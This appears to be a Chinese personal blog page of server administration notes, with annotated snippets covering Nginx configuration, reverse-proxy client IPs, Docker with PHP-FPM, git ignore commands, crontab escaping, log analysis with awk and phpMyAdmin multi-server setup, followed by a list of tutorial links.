<h3 id="Nginx-配置常用参数"><a href="#Nginx-配置常用参数" class="headerlink" title="Nginx 配置常用参数"></a>Nginx 配置常用参数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"># 配置用户或者组，默认为nobody nobody。</span><br><span class="line">#user www www;  </span><br><span class="line"></span><br><span class="line"> #Nginx开启的worker进程数，建议为CPU的核数</span><br><span class="line">#worker_processes 2; </span><br><span class="line"></span><br><span class="line">#指定nginx进程运行文件存放地址</span><br><span class="line">#pid /nginx/pid/nginx.pid;</span><br><span class="line"></span><br><span class="line">#指定日志路径，级别。这个设置可以放入全局块、http块、server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span><br><span class="line">error_log log/error.log debug; </span><br><span class="line"></span><br><span class="line">#可以在任意地方使用include指令实现配置文件的包含，类似于apache中的include方法，可减少主配置文件长度。</span><br><span class="line">include vhosts<span class="comment">/*.conf;</span></span><br><span class="line"><span class="comment">事件模块</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">events &#123;</span></span><br><span class="line"><span class="comment">    #设置网路连接序列化，防止惊群现象发生，默认为on</span></span><br><span class="line"><span class="comment">    accept_mutex on; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #默认: 500ms 如果一个进程没有互斥锁，它将延迟至少多长时间。默认情况下，延迟是500ms 。</span></span><br><span class="line"><span class="comment">    accept_mutex_delay 100ms; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #设置一个进程是否同时接受多个网络连接，默认为off</span></span><br><span class="line"><span class="comment">    multi_accept on;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport，不建议设置，nginx会自行选择</span></span><br><span class="line"><span class="comment">    #use epoll;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #最大连接数，默认为512</span></span><br><span class="line"><span class="comment">    worker_connections  1024;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">http 部分</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">http &#123;</span></span><br><span class="line"><span class="comment">    #文件扩展名与文件类型映射表</span></span><br><span class="line"><span class="comment">    include       mime.types;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # 默认文件类型，默认为text/plain</span></span><br><span class="line"><span class="comment">    default_type  application/octet-stream; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #取消服务日志 </span></span><br><span class="line"><span class="comment">    #access_log off; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。</span></span><br><span class="line"><span class="comment">    sendfile on;   </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span></span><br><span class="line"><span class="comment">    sendfile_max_chunk 100k;  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #连接超时时间，默认为75s，可以在http，server，location块。</span></span><br><span class="line"><span class="comment">    keepalive_timeout 65;  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #开启gzip资源压缩</span></span><br><span class="line"><span class="comment">    gzip  on; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    # 负载均衡，详细可看了一篇文章：https://learnku.com/articles/36737</span></span><br><span class="line"><span class="comment">    upstream blog &#123;   </span></span><br><span class="line"><span class="comment">        server 192.167.20.19:8081;</span></span><br><span class="line"><span class="comment">        server 192.168.10.121:8080 weight=5;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #设定请求缓冲</span></span><br><span class="line"><span class="comment">    client_header_buffer_size    128k;</span></span><br><span class="line"><span class="comment">    large_client_header_buffers  4 128k;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    #上传文件的大小限制  默认1m</span></span><br><span class="line"><span class="comment">    client_max_body_size 8m;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    server &#123;</span></span><br><span class="line"><span class="comment">        #单连接请求上限次数。</span></span><br><span class="line"><span class="comment">        keepalive_requests 120;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #监听端口</span></span><br><span class="line"><span class="comment">        listen       80;   </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #监听地址</span></span><br><span class="line"><span class="comment">        server_name  blog.13sai.com;  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #设定日志格式</span></span><br><span class="line"><span class="comment">        log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line"><span class="comment">                      '$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line"><span class="comment">                      '"$http_user_agent" "$http_x_forwarded_for"';</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        access_log  /data/logs/access.log  main;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        # 根目录</span></span><br><span class="line"><span class="comment">        root /www/web/public; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        # 定义错误提示页面</span></span><br><span class="line"><span class="comment">        error_page   500 502 503 504 /50x.html;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        location /static/ &#123;</span></span><br><span class="line"><span class="comment">            #root与alias主要区别在于nginx如何解释location后面的uri，这会使两者分别以不同的方式将请求映射到服务器文件上。</span></span><br><span class="line"><span class="comment">            #root的处理结果是：root路径＋location路径</span></span><br><span class="line"><span class="comment">            #alias的处理结果是：使用alias路径替换location路径</span></span><br><span class="line"><span class="comment">            alias /www/static/;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            #过期30天，静态文件不怎么更新，过期可以设大一点,如果频繁更新，则可以设置得小一点。</span></span><br><span class="line"><span class="comment">            expires 30d;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        # 处理php请求到fpm端口</span></span><br><span class="line"><span class="comment">        location ~ \.php$ &#123;</span></span><br><span class="line"><span class="comment">            fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="comment">            fastcgi_index  index.php;</span></span><br><span class="line"><span class="comment">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="comment">            include        fastcgi_params;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        location / &#123;</span></span><br><span class="line"><span class="comment">            proxy_set_header Host $host;</span></span><br><span class="line"><span class="comment">            proxy_set_header  X-Real-IP  $remote_addr;</span></span><br><span class="line"><span class="comment">            proxy_pass  http://blog;  #请求转向blog 定义的服务器列表 </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        #禁止访问文件</span></span><br><span class="line"><span class="comment">        location ~ /.git &#123;</span></span><br><span class="line"><span class="comment">            deny all;</span></span><br><span class="line"><span class="comment">            allow 127.0.0.1; #允许的ip </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125; https://learnku.com/articles/36768</span></span><br></pre></td></tr></table></figure>
<h3 id="反向代理后如何获取真实客户端-IP"><a href="#反向代理后如何获取真实客户端-IP" class="headerlink" title="反向代理后如何获取真实客户端 IP"></a>反向代理后如何获取真实客户端 IP</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">location /api &#123; </span><br><span class="line">           rewrite  ^<span class="regexp">/api/</span>(.*)$ /api/$<span class="number">1</span> <span class="keyword">break</span>;</span><br><span class="line">           proxy_pass   https:<span class="comment">//***.*********.com;</span></span><br><span class="line">   &#125;</span><br><span class="line">   proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">   proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">   如果有报错</span><br><span class="line">   Starting nginx: nginx: [warn] could not build optimal proxy_headers_hash, you should increase either proxy_headers_hash_max_size: <span class="number">512</span> or proxy_headers_hash_bucket_size: <span class="number">64</span>; ignoring proxy_headers_hash_bucket_size</span><br><span class="line">   </span><br><span class="line">       nginx.conf 下的http 模块下设置</span><br><span class="line">       proxy_headers_hash_max_size <span class="number">51200</span>;</span><br><span class="line">       proxy_headers_hash_bucket_size <span class="number">6400</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="number">3</span> 代码里面获取</span><br><span class="line">      $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">   https:<span class="comment">//learnku.com/articles/36832</span></span><br></pre></td></tr></table></figure>
<h3 id="docker-入门"><a href="#docker-入门" class="headerlink" title="docker 入门"></a>docker 入门</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux 或 Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</span><br><span class="line">docker images -- 常看本地镜像</span><br><span class="line">docker ps -- 查看容器，默认只查看已启动的，加入 <span class="string">"-a"</span> 参数可以查看所有</span><br><span class="line">docker start|stop|rm|rmi -- 容器的相关操作，分别对应： 开启 | 停止 | 删除容器 | 删除镜像</span><br><span class="line">docker pull ubuntu</span><br><span class="line"></span><br><span class="line">docker run -itd --name test-ubuntu ubuntu</span><br><span class="line">docker exec -it test-ubuntu /bin/bash</span><br><span class="line">docker pull php:<span class="number">7.3</span><span class="number">.5</span>-fpm</span><br><span class="line">docker run -itd -p <span class="number">9001</span>:<span class="number">9000</span> -v /Users/admin/Site/php7<span class="number">.3</span><span class="number">.5</span>:<span class="regexp">/data --name php-test php:7.3.5-fpm</span></span><br><span class="line"><span class="regexp">docker exec -it php-test /</span>bin/bash</span><br><span class="line">vi /etc/nginx/config.d/php.conf</span><br><span class="line">server &#123;</span><br><span class="line">    # 监听端口</span><br><span class="line">    listen       <span class="number">8002</span>;</span><br><span class="line"></span><br><span class="line">    # 域名设定</span><br><span class="line">    server_name  <span class="number">122.51</span><span class="number">.155</span><span class="number">.172</span>;</span><br><span class="line"></span><br><span class="line">    root /usr/share/nginx/html/php/; # 该项要修改为你准备存放相关网页的路径，如果存在fast-cgi的root字段，这里貌似就没效果了</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line"></span><br><span class="line">    index index.php index.html;</span><br><span class="line"></span><br><span class="line">    # 打开目录浏览功能，可以列出整个目录</span><br><span class="line"></span><br><span class="line">    autoindex on;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #proxy the php scripts to php-fpm</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">    # fastcgi配置</span><br><span class="line"></span><br><span class="line">    # 指定是否传递4xx和5xx错误信息到客户端</span><br><span class="line"></span><br><span class="line">    fastcgi_intercept_errors on;</span><br><span class="line"></span><br><span class="line">    # 指定FastCGI服务器监听端口与地址，可以是本机或者其它,这里是重点，需要指定php-fpm容器的端口和根目录</span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9001</span>;</span><br><span class="line">    root /data;</span><br><span class="line">    fastcgi_index index.php;</span><br><span class="line">    include  fastcgi_params;</span><br><span class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">sysctemclt restart nginx </span><br><span class="line">vi /usr/share/nginx/html/php/inde.php </span><br><span class="line">访问http:<span class="comment">//122.51.155.172:8002/</span></span><br><span class="line">Dockerfile 是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker 通过读取 Dockerfile 中的指令自动生成映像。</span><br><span class="line">FROM php:<span class="number">7.3</span><span class="number">.5</span>-fpm</span><br><span class="line">MAINTAINER liyan</span><br><span class="line"></span><br><span class="line">#安装环境系统命令</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">vim \</span><br><span class="line">libssl-dev</span><br><span class="line"></span><br><span class="line">#安装PHP扩展</span><br><span class="line">RUN pecl install igbinary \</span><br><span class="line">redis<span class="number">-4.0</span><span class="number">.2</span> \</span><br><span class="line">swoole</span><br><span class="line"></span><br><span class="line">#配置php.ini</span><br><span class="line">RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini &amp;&amp; \</span><br><span class="line">ln -s /usr/local/etc/php/php.ini /etc/php.ini &amp;&amp; \</span><br><span class="line">echo <span class="string">"extension=igbinary.so\nextension=redis.so\nextension=swoole.so"</span> &gt;&gt; <span class="regexp">/etc/</span>php.ini</span><br><span class="line"></span><br><span class="line">EXPOSE <span class="number">9300</span></span><br><span class="line">VOLUME [<span class="string">"/data"</span>]</span><br><span class="line">WORKDIR /data</span><br><span class="line">https:<span class="comment">//learnku.com/articles/36739</span></span><br></pre></td></tr></table></figure>
<h3 id="忽略文件"><a href="#忽略文件" class="headerlink" title="忽略文件"></a>忽略文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">已经推送 push 过的文件，想在以后的提交时忽略此文件，即使本地已经修改过，而且不删除 Git 远程库中相应文件，后面的 Xml/config.xml 是要忽略的文件的路径，执行命令：</span><br><span class="line"></span><br><span class="line">git update-index --assume-unchanged Xml/config.xml  </span><br><span class="line">恢复忽略的文件，执行命令：</span><br><span class="line"></span><br><span class="line">git update-index --no--assume-unchanged Xml/config.xml  </span><br><span class="line">如果要忽略一个目录，打开 git bash，定位到目标目录下，后面的 Xml/test/ 是要忽略的目录的路径，执行命令：</span><br><span class="line"></span><br><span class="line">git update-index --assume-unchanged $(git ls-files Xml/test/ | tr <span class="string">'\n'</span> <span class="string">' '</span>)</span><br><span class="line">清除指定目录下没有被 push 过的文件和文件夹，执行命令：</span><br><span class="line"></span><br><span class="line">git clean -df supplier/web    https:<span class="comment">//learnku.com/articles/37298</span></span><br></pre></td></tr></table></figure>
<h3 id="crontab-截断"><a href="#crontab-截断" class="headerlink" title="crontab %截断"></a>crontab %截断</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">0</span> * * * cd /home/vg/odp/log &amp;&amp; mv *<span class="string">`date -d "-10 day" "+%Y%m%d"`</span>* archives</span><br><span class="line">crontab的执行情况，linux都会给对应的用户发邮件，因此可以通过邮件来定位问题。上面的任务在vg用户下，查看对应的邮件 /<span class="keyword">var</span>/spool/mail/vg</span><br><span class="line">Subject那一行：</span><br><span class="line">Subject: Cron cd /home/vg/odp/log &amp;&amp; mv *<span class="string">`date -d "-10 day" "+</span></span><br><span class="line"><span class="string">显示的命令不全，到加号就结束了，%和后面的部分丢失了，结合报错基本可以定位原因，%是crontab里的特殊符号，表示新的一行开始，所以前面的命令就被截断了。</span></span><br><span class="line"><span class="string">解决方式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果crontab执行的命令中包含%需要用\转义，上面的例字改成这样就可以成功执行：</span></span><br><span class="line"><span class="string">0 0 * * * cd /home/vg/odp/log &amp;&amp; mv *`</span>date -d <span class="string">"-10 day"</span> <span class="string">"+\%Y\%m\%d"</span><span class="string">`* archives</span></span><br><span class="line"><span class="string">https://www.daemoncoder.com/a/%E8%AE%B0%E4%B8%80%E6%AC%A1crontab%E4%B8%ADdate%E5%91%BD%E4%BB%A4%E9%94%99%E7%94%A8%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98/4d54453d</span></span><br></pre></td></tr></table></figure>
<h3 id="查出访问量TOP10的IP"><a href="#查出访问量TOP10的IP" class="headerlink" title="查出访问量TOP10的IP"></a>查出访问量TOP10的IP</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">日志文件access.log格式如下：</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">18</span>/Nov/<span class="number">2018</span>:<span class="number">17</span>:<span class="number">26</span>:<span class="number">54</span> +<span class="number">0800</span>] <span class="string">"GET / HTTP/1.0"</span> <span class="number">200</span> <span class="number">3283</span> <span class="string">"-"</span> <span class="string">""</span> <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"</span> <span class="number">0.012</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span> daemoncoder.com <span class="string">"-"</span></span><br><span class="line">Linux命令：</span><br><span class="line"></span><br><span class="line">awk -F <span class="string">" "</span> <span class="string">'&#123;count[$1]++&#125; END &#123;for (i in count) &#123;printf("%s\t%d\n", i, count[i]);&#125;&#125;'</span> access.log | sort -nrk <span class="number">2</span> | head</span><br><span class="line">通过awk对日志中的每一行ip进行计数统计，并按ip count格式输出。</span><br><span class="line"></span><br><span class="line">通过sort命令按照第二列降序排序：-t 指定分割符是空格; -n指定按数字大小排序; -r 指定降序输出; -k 指定按分隔后的第二列排序</span><br><span class="line"></span><br><span class="line">通过head命令取出前十条。https:<span class="comment">//www.daemoncoder.com/a/%E4%B8%80%E8%A1%8CLinux%E5%91%BD%E4%BB%A4%E6%9F%A5%E5%87%BA%E8%AE%BF%E9%97%AE%E9%87%8FTOP10%E7%9A%84IP/4d773d3d</span></span><br></pre></td></tr></table></figure>
<h3 id="phpmyadmin-管理多台-MySQL"><a href="#phpmyadmin-管理多台-MySQL" class="headerlink" title="phpmyadmin 管理多台 MySQL"></a>phpmyadmin 管理多台 MySQL</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">复制 phpMyAdmin 根目录下的 config.sample.inc.php 文件，重命名为 config.inc.php；</span><br><span class="line">在文件中定义你的多台服务器配置信息：</span><br><span class="line">$hosts = [</span><br><span class="line">    <span class="number">1</span> =&gt; [<span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>, <span class="string">'user'</span> =&gt; <span class="string">'root'</span>, <span class="string">'password'</span> =&gt; <span class="string">'root'</span>],</span><br><span class="line">    <span class="number">2</span> =&gt; [<span class="string">'host'</span> =&gt; <span class="string">'192.168.10.10'</span>, <span class="string">'user'</span> =&gt; <span class="string">'homestead'</span>, <span class="string">'password'</span> =&gt; <span class="string">'secret'</span>]</span><br><span class="line">];</span><br><span class="line">在加入以下代码片段，通过 <span class="keyword">for</span> 循环来读取多台 MySQL 服务器配置信息</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= count($hosts); $i++)&#123;</span><br><span class="line">    <span class="comment">/* Authentication type */</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'auth_type'</span>] = <span class="string">'cookie'</span>;</span><br><span class="line">    <span class="comment">/* Server parameters */</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'host'</span>] = $hosts[$i][<span class="string">'host'</span>];    <span class="comment">//修改host</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'connect_type'</span>] = <span class="string">'tcp'</span>;</span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'compress'</span>] = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/* Select mysqli if your server has it */</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'extension'</span>] = <span class="string">'mysql'</span>;</span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'AllowNoPassword'</span>] = <span class="literal">true</span>;</span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'user'</span>] = $hosts[$i][<span class="string">'user'</span>];    <span class="comment">//修改用户名</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'password'</span>] = $hosts[$i][<span class="string">'password'</span>];    <span class="comment">//密码</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/31740</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/37335" target="_blank" rel="noopener">Nginx+rtmp 模块搭建流媒体视频点播服务</a></p>
<p><a href="https://learnku.com/linux/wikis/36492" target="_blank" rel="noopener">linux wiki</a></p>
<p><a href="https://learnku.com/articles/37287" target="_blank" rel="noopener">Nginx 站点开启 HTTPS </a></p>
<p><a href="https://learnku.com/articles/37157#reply119179" target="_blank" rel="noopener">Docker 中安装 RabbitMQ</a></p>
<p><a href="https://learnku.com/articles/36986" target="_blank" rel="noopener">Nginx 内嵌变量</a></p>
<p><a href="https://learnku.com/articles/33689" target="_blank" rel="noopener">Git 实现 Laravel 项目的自动化部署</a></p>
<p><a href="https://learnku.com/articles/36857" target="_blank" rel="noopener">Nginx 代理缓存</a></p>
<p><a href="https://learnku.com/articles/36852#reply118312" target="_blank" rel="noopener">Git 的代码自动发布</a></p>
<p><a href="https://learnku.com/articles/36207" target="_blank" rel="noopener">Elasticsearch  es安装和简单配置</a></p>
<p><a href="https://learnku.com/linux/t/36120" target="_blank" rel="noopener">配置安全的 SSH 服务</a></p>
<p><a href="https://learnku.com/linux/t/36233" target="_blank" rel="noopener">使用 fail2ban 来防范 SSH 暴力破解</a></p>
<p><a href="https://crontab.guru/" target="_blank" rel="noopener">在线crontab</a></p>
<p><a href="https://github.com/jianyan74/dockerfiles" target="_blank" rel="noopener">docker 快速搭建稳定安全的开发/生产环境</a></p>
<p><a href="https://gleehub.com/program/wsl-xia-you-ya-di-coding.html" target="_blank" rel="noopener">windows 10 WSL编码</a></p>
<p><a href="https://learnku.com/articles/33469" target="_blank" rel="noopener">初识 Shell</a></p>
<p><a href="http://einverne.github.io/post/2019/01/html-to-pdf.html" target="_blank" rel="noopener">html 转 pdf 命令行工具 wkhtmltopdf </a></p>
<p><a href="https://me.jinchuang.org/archives/301.html" target="_blank" rel="noopener">Centos7 搭建 Nextcloud个人网盘</a></p>
<p><a href="https://github.com/mylxsw/growing-up/blob/master/doc/%E4%B8%89%E5%8D%81%E5%88%86%E9%92%9F%E5%AD%A6%E4%BC%9ASED.md" target="_blank" rel="noopener">三十分钟学会sed</a></p>
<p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html" target="_blank" rel="noopener">Linux工具快速教程</a></p>
<p><a href="http://qinghua.github.io/sed/" target="_blank" rel="noopener">看例子学sed</a></p>
<p><a href="https://michael728.github.io/2018/07/05/linux-useful-commands-in-work/" target="_blank" rel="noopener">工作中常用的 Linux 命令</a></p>
<p><a href="https://michael728.github.io/2019/04/14/linux-useful-shell-commands-in-work/" target="_blank" rel="noopener">工作中常用的 Shell 命令及技巧</a></p>
<p><a href="https://linux.hellocode.name/user-group.html" target="_blank" rel="noopener">PHPer 必知必会的 Linux 命令</a></p>
<p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html#" target="_blank" rel="noopener">Linux工具快速教程</a></p>
<p><a href="https://segmentfault.com/a/1190000016648034" target="_blank" rel="noopener">你可能不知道的shell技巧</a></p>
